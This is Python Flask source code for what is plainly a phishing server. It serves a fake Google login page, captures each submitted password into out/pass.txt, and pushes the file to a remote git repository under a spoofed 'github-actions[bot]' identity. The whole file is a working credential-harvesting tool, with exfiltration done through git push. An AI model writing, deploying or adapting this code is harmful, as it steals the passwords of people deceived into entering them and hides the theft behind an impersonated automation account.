from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import logging
import sys
import os
import subprocess
import datetime

# Отключаем лишние логи
logging.getLogger('werkzeug').setLevel(logging.ERROR)
sys.stdout = sys.__stdout__

# Гарантируем, что папка out/ существует
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(BASE_DIR, "out")
os.makedirs(OUT_DIR, exist_ok=True)

# Путь к лог-файлу
PASSWORD_LOG_PATH = os.path.join(OUT_DIR, "pass.txt")

# Flask-приложение
app = Flask(__name__)
CORS(app)

def write_password_to_file(password):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"{timestamp} - 🔐 Пароль: {password}\n"
    try:
        with open(PASSWORD_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(log_line)
            f.flush()
        print("✅ Пароль записан:", password)
        sys.stdout.flush()
        return True
    except Exception as e:
        print(f"❌ Ошибка при записи пароля: {e}")
        sys.stdout.flush()
        return False

def git_commit_and_push():
    try:
        subprocess.run(["git", "config", "user.name", "github-actions[bot]"], check=True)
        subprocess.run(["git", "config", "user.email", "github-actions[bot]@users.noreply.github.com"], check=True)
        subprocess.run(["git", "add", PASSWORD_LOG_PATH], check=True)
        subprocess.run(["git", "commit", "-m", "🔐 Добавлен новый пароль"], check=True)
        subprocess.run(["git", "push"], check=True)
        print("🚀 Git push завершён.")
    except subprocess.CalledProcessError as e:
        print(f"⚠️ Git ошибка: {e}")
        sys.stdout.flush()

@app.route('/auth', methods=['POST'])
def auth():
    data = request.form
    password = data.get('password')
    if write_password_to_file(password):
        git_commit_and_push()
    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return send_file("target/login.html")

@app.route("/login")
def login():
    return send_file("target/Google.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
